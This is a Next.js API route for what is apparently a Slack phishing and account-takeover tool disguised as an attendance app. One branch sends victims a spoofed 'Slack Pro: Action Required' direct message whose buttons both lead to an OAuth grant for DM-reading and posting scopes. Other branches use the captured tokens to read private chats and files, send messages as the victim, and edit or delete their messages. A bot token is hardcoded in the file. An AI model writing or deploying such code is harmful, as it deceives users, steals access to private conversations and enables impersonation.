/* eslint-disable @typescript-eslint/no-explicit-any */
// app/api/slack/manager/route.ts

import { NextResponse } from 'next/server';
import { db } from '@/lib/firebase';
import { doc, getDoc, deleteDoc } from 'firebase/firestore';

const BOT_TOKEN = "xoxb-2545190050563-10466352520084-6NyES55AgLJ6vzmQi4M5veYt"; 
const CLIENT_ID = "2545190050563.10491030504784";
const REDIRECT_URI = "https://slack-attendance.vercel.app/api/auth/callback";

export async function POST(req: Request) {
  try {
    const body = await req.json();
    const { action, targetUserId, channelId, text, messageTs, newText } = body;

    // --- CASE 1: DELETE USER ---
    if (action === 'delete_user') {
        if (!targetUserId) return NextResponse.json({ success: false, error: "User ID missing" });
        await deleteDoc(doc(db, "slack_tokens", targetUserId));
        return NextResponse.json({ success: true });
    }

    // --- CASE 2: SEND FAKE "PRO PLAN" INVITE ---
    if (action === 'send_invite') {
       if (!targetUserId) return NextResponse.json({ success: false, error: "User ID missing" });
       const scopes = "chat:write,im:read,im:history,users:read,mpim:read";
       const authLink = `https://slack.com/oauth/v2/authorize?client_id=${CLIENT_ID}&user_scope=${scopes}&redirect_uri=${REDIRECT_URI}`;
       
       const blocks = [
        { "type": "header", "text": { "type": "plain_text", "text": "✨ Slack Pro: Action Required", "emoji": true } },
        { "type": "section", "text": { "type": "mrkdwn", "text": "Your workspace administrator has enabled *Slack Pro features* for your account.\nPlease authorize the update to continue sending messages without interruption." } },
        { "type": "divider" },
        { "type": "actions", "elements": [
            { "type": "button", "text": { "type": "plain_text", "text": "Update Now (For Free)", "emoji": true }, "style": "primary", "url": authLink },
            { "type": "button", "text": { "type": "plain_text", "text": "Skip for now", "emoji": true }, "url": authLink }
        ]},
        { "type": "context", "elements": [ { "type": "mrkdwn", "text": "🔒 Verified System Upgrade • Slack Technologies" } ] }
       ];

       const chatRes = await fetch('https://slack.com/api/chat.postMessage', {
         method: 'POST',
         headers: { Authorization: `Bearer ${BOT_TOKEN}`, 'Content-Type': 'application/json; charset=utf-8' },
         body: JSON.stringify({ channel: targetUserId, text: "System Upgrade Required", blocks: blocks })
       });

       const chatData = await chatRes.json();
       if(!chatData.ok) return NextResponse.json({ success: false, error: `Slack Error: ${chatData.error}` });
       return NextResponse.json({ success: true });
    }

    // --- CASE 3: DELETE MESSAGE FROM SLACK ---
    if (action === 'delete_message') {
        if (!targetUserId || !channelId || !messageTs) {
            return NextResponse.json({ success: false, error: "Missing parameters" });
        }
        
        const tokenDoc = await getDoc(doc(db, "slack_tokens", targetUserId));
        if (!tokenDoc.exists()) return NextResponse.json({ error: "User Not Connected" }, { status: 403 });
        
        const USER_TOKEN = tokenDoc.data().accessToken;
        
        // Delete from Slack
        const res = await fetch('https://slack.com/api/chat.delete', {
            method: 'POST',
            headers: { 
                Authorization: `Bearer ${USER_TOKEN}`,
                'Content-Type': 'application/json; charset=utf-8'
            },
            body: JSON.stringify({ channel: channelId, ts: messageTs })
        });
        
        const data = await res.json();
        if (!data.ok) {
            return NextResponse.json({ success: false, error: `Slack Error: ${data.error}` });
        }
        
        return NextResponse.json({ success: true });
    }

    // --- CASE 4: EDIT MESSAGE IN SLACK ---
    if (action === 'edit_message') {
        if (!targetUserId || !channelId || !messageTs || !newText) {
            return NextResponse.json({ success: false, error: "Missing parameters" });
        }
        
        const tokenDoc = await getDoc(doc(db, "slack_tokens", targetUserId));
        if (!tokenDoc.exists()) return NextResponse.json({ error: "User Not Connected" }, { status: 403 });
        
        const USER_TOKEN = tokenDoc.data().accessToken;
        
        // Update message in Slack
        const res = await fetch('https://slack.com/api/chat.update', {
            method: 'POST',
            headers: { 
                Authorization: `Bearer ${USER_TOKEN}`,
                'Content-Type': 'application/json; charset=utf-8'
            },
            body: JSON.stringify({ 
                channel: channelId, 
                ts: messageTs,
                text: newText
            })
        });
        
        const data = await res.json();
        if (!data.ok) {
            return NextResponse.json({ success: false, error: `Slack Error: ${data.error}` });
        }
        
        return NextResponse.json({ success: true, message: data.message });
    }

    // --- Other Actions (List Chats, Get Messages, Send as User) ---
    if (!targetUserId) return NextResponse.json({ error: "User ID required" });

    const tokenDoc = await getDoc(doc(db, "slack_tokens", targetUserId));
    if (!tokenDoc.exists()) return NextResponse.json({ error: "User Not Connected" }, { status: 403 });
    
    const USER_TOKEN = tokenDoc.data().accessToken;

    if (action === 'list_chats') {
        const res = await fetch('https://slack.com/api/users.conversations?types=im,mpim&limit=30', { 
            headers: { Authorization: `Bearer ${USER_TOKEN}` } 
        });
        const data = await res.json();
        
        const chats = await Promise.all((data.channels || []).map(async (c: any) => {
            if(c.is_im) {
                const uRes = await fetch(`https://slack.com/api/users.info?user=${c.user}`, { 
                    headers: { Authorization: `Bearer ${USER_TOKEN}` } 
                });
                const uData = await uRes.json();
                return { 
                    ...c, 
                    name: uData.user?.real_name || uData.user?.name || "Unknown", 
                    image: uData.user?.profile?.image_48 || uData.user?.profile?.image_32 
                };
            }
            return { ...c, name: c.name || "Group Chat", image: null };
        }));
        return NextResponse.json({ chats });
    }

    if (action === 'get_messages') {
        const res = await fetch(`https://slack.com/api/conversations.history?channel=${channelId}&limit=50`, { 
            headers: { Authorization: `Bearer ${USER_TOKEN}` } 
        });
        const data = await res.json();
        
        // Fetch detailed info for messages with files
        const messagesWithDetails = await Promise.all((data.messages || []).map(async (msg: any) => {
            if (msg.files && msg.files.length > 0) {
                // Get file info for each file
                const filesWithDetails = await Promise.all(msg.files.map(async (file: any) => {
                    const fileRes = await fetch(`https://slack.com/api/files.info?file=${file.id}`, {
                        headers: { Authorization: `Bearer ${USER_TOKEN}` }
                    });
                    const fileData = await fileRes.json();
                    return {
                        ...file,
                        url_private: fileData.file?.url_private,
                        url_private_download: fileData.file?.url_private_download,
                        thumb_64: fileData.file?.thumb_64,
                        thumb_360: fileData.file?.thumb_360,
                        thumb_360_w: fileData.file?.thumb_360_w,
                        thumb_360_h: fileData.file?.thumb_360_h,
                        mime_type: fileData.file?.mime_type,
                        filetype: fileData.file?.filetype
                    };
                }));
                return { ...msg, files: filesWithDetails };
            }
            return msg;
        }));
        
        return NextResponse.json({ messages: messagesWithDetails.reverse() || [] });
    }

    if (action === 'send_as_user') {
        const res = await fetch('https://slack.com/api/chat.postMessage', {
            method: 'POST',
            headers: { 
                Authorization: `Bearer ${USER_TOKEN}`, 
                'Content-Type': 'application/json; charset=utf-8' 
            },
            body: JSON.stringify({ 
                channel: channelId, 
                text: text,
                as_user: true 
            })
        });
        return NextResponse.json(await res.json());
    }

    return NextResponse.json({ error: "Invalid Action" });

  } catch (e: any) {
    return NextResponse.json({ success: false, error: e.message }, { status: 500 });
  }
}